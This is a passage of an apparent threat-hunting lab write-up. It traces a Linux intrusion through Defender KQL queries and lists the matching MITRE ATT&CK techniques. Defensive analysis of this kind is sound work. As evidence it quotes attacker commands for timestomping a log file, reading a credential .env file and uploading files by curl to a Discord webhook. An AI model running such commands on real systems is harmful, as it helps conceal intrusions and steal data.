**Why It Matters:** The attacker pivoted to Discord's webhook API to exfiltrate data over HTTPS to a domain that most egress filters allow. This is an increasingly common technique: legitimate SaaS platforms with trusted certificates are used as exfiltration channels because blocking them would disrupt legitimate business operations. The webhook URL contains a permanent authentication token — reporting it to Discord Trust & Safety may enable the channel to be seized and the attacker's server identified.

**KQL Query Used:**

```kql
DeviceNetworkEvents
| where TimeGenerated between (todatetime('2026-02-11T04:16:21.185Z') .. todatetime('2026-02-14T23:59:59Z'))
| where DeviceName contains "rocky83" and ActionType != "ConnectionFailed" and InitiatingProcessCommandLine startswith "curl"
| project TimeGenerated, ActionType, InitiatingProcessCommandLine
| order by TimeGenerated desc
```

---

### 🌐 25. Exfil Endpoint

**Objective:** Identify the IP address and port that carried the successful exfiltration.

**What to Hunt:** Network events tied to the curl webhook command reveal the resolved IP and destination port.

**Identified Activity:**

```
TimeGenerated [UTC]:    2026-02-13T20:10:51.331348Z
RemoteIP:               162.159.135.232
RemotePort:             443
```

**Answer:** `162.159.135.232:443`

**Why It Matters:** `162.159.135.232` resolves to Cloudflare infrastructure serving Discord's API endpoints. The use of port 443 (HTTPS) ensures the transfer is encrypted and indistinguishable from normal web traffic at the network layer. Standard IP-based blocking will not prevent future attacks using this vector — egress controls need to be evaluated at the domain/application layer to detect or block webhook-based exfiltration.

**KQL Query Used:**

```kql
DeviceNetworkEvents
| where TimeGenerated between (todatetime('2026-02-11T04:16:21.185Z') .. todatetime('2026-02-14T23:59:59Z'))
| where InitiatingProcessCommandLine startswith "curl -F file=@integration_state_"
| project TimeGenerated, RemoteIP, RemotePort
```

---

### 🧹 26. Selective Log Erasure

**Objective:** Count the total distinct `sed -i` delete operations run across `/var/log/secure` and `/var/log/messages` in the cleanup window.

**What to Hunt:** `sed` process events with in-place delete flags targeting the two log files between 16:13 and 16:16 UTC on 11 February.

**Identified Activity:**

```
Count: 12
Files: /var/log/secure AND /var/log/messages
```

**Answer:** `12`

**Why It Matters:** Twelve targeted `sed` deletions across two log files signals deliberate, selective log sanitisation — not a bulk wipe. The attacker removed only specific log entries (likely their own activity timestamps, authentication events, and command executions) while leaving the rest of the log intact. This is significantly harder to detect than full log deletion and may leave incomplete log files that appear legitimate at first glance.

**KQL Query Used:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2026-02-11T16:13:00Z') .. todatetime('2026-02-11T16:16:00Z'))
| where DeviceName startswith "rocky83"
| where FileName =~ "sed"
| where ProcessCommandLine has "-i" and (ProcessCommandLine has "/var/log/secure" or ProcessCommandLine has "/var/log/messages")
| project TimeGenerated, ProcessCommandLine
| count
```

---

### 🛠️ 27. Log Manipulation Primitive

**Objective:** Identify the specific binary used to manipulate the log files.

**Identified Activity:** *(Derived from the same query as Finding 26)*

**Answer:** `sed`

**Why It Matters:** `sed` (stream editor) is a native Unix utility available on every Linux system. Its in-place edit mode (`-i`) with address-based deletion patterns (`/pattern/d`) makes it ideal for targeted log sanitisation. Because `sed` is a standard system tool, its use does not trigger alerts based on unusual binary presence — only behavioural detection of it writing to log file paths catches this technique.

---

### 🕐 28. Timeline Distortion

**Objective:** Identify the forged timestamp applied to `/var/log/messages` after the selective deletions.

**What to Hunt:** `touch` commands with the `-d` flag targeting `/var/log/messages` reveal timestamp manipulation.

**Identified Activity:**

```
TimeGenerated [UTC]:    2026-02-11T16:16:47.127195Z
FileName:               touch
ProcessCommandLine:     touch -d "2026-02-06 12:00:00" /var/log/messages
AccountName:            it.admin
```

**Answer:** `2026-02-06 12:00:00`

**Why It Matters:** The attacker backdated `/var/log/messages` to 6 February — four days before the main intrusion activity began — to blur causality and make forensic timeline reconstruction harder. A defender reviewing `ls -la /var/log/` would see a modification date predating the intrusion window, potentially causing them to dismiss the file as unmodified during the incident. The EDR raised its own alert on this action, confirming the technique was detected despite the attacker's effort.

**KQL Query Used:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2026-02-11T16:00:00Z') .. todatetime('2026-02-11T17:00:00Z'))
| where DeviceName startswith "rocky83"
| where FileName == "touch" and ProcessCommandLine has "/var/log/messages"
| project TimeGenerated, FileName, ProcessCommandLine, AccountName
```

---

### 🚨 29. Cleanup Alert Classification

**Objective:** Identify the MITRE ATT&CK technique classification assigned by the EDR alert on the cleanup and timestamp activity.

**What to Hunt:** Alert evidence for suspicious timestamp modification activity on rocky83 in the post-exfiltration cleanup window.

**Identified Activity:**

```
TimeGenerated [UTC]:    2026-02-11T16:16:43.507505Z
Title:                  Suspicious timestamp modification
Categories:             ["DefenseEvasion"]
AttackTechniques:       ["Indicator Removal (T1070)","Timestomp (T1070.006)"]
```

**Answer:** `["Indicator Removal (T1070)","Timestomp (T1070.006)"]`

**Why It Matters:** The EDR correctly classified the activity as T1070 (Indicator Removal) and T1070.006 (Timestomp) — confirming that automated detection caught what the attacker was trying to conceal. This demonstrates that even when the attacker successfully executed cleanup actions, the EDR telemetry still captured the cleanup itself. The alert was generated before the modification completed, meaning defenders had an opportunity to respond in near real-time had alert triage been active.

**KQL Query Used:**

```kql
AlertEvidence
| where TimeGenerated between (todatetime('2026-02-11T16:00:00Z') .. todatetime('2026-02-11T17:00:00Z'))
| where DeviceName startswith "rocky83" and Title contains "Timestamp"
| project TimeGenerated, Title, Categories, AttackTechniques
| order by TimeGenerated asc
```

---

## 🔗 MITRE ATT&CK Technique Summary

| Technique ID | Name | Phase | Evidence |
|-------------|------|-------|---------|
| T1078 | Valid Accounts | Initial Access / Persistence | `it.admin` account used for remote logon |
| T1059.006 | Python | Execution | Python reverse shell one-liner |
| T1082 | System Information Discovery | Discovery | `/etc/*-release` file reads |
| T1033 | System Owner / User Discovery | Discovery | `who` command (PID 7214) |
| T1613 | Container and Resource Discovery | Discovery | `docker inspect openemr-mariadb` |
| T1552.001 | Credentials in Files | Credential Access | `sed -n 1,200p /etc/openemr/audit_export.env` |
| T1611 | Escape to Host | Privilege Escalation | `sudo -i` from `it.admin` to root |
| T1136 | Create Account | Persistence | `vipw -s` creating `system` account |
| T1543.002 | Systemd Service | Persistence | `integration-monitor.service` |
| T1074.001 | Local Data Staging | Collection | `/var/lib/integrations/` staging directory |
| T1048.003 | Exfiltration Over Alternative Protocol | Exfiltration | Discord webhook via `curl` |
| T1071.001 | Web Protocols | Command and Control | Reverse shell over port 443 |
| T1070.001 | Clear Linux or Mac System Logs | Defense Evasion | 12 `sed -i` deletions on `/var/log/secure` and `/var/log/messages` |
| T1070.006 | Timestomp | Defense Evasion | `touch -d "2026-02-06 12:00:00" /var/log/messages` |

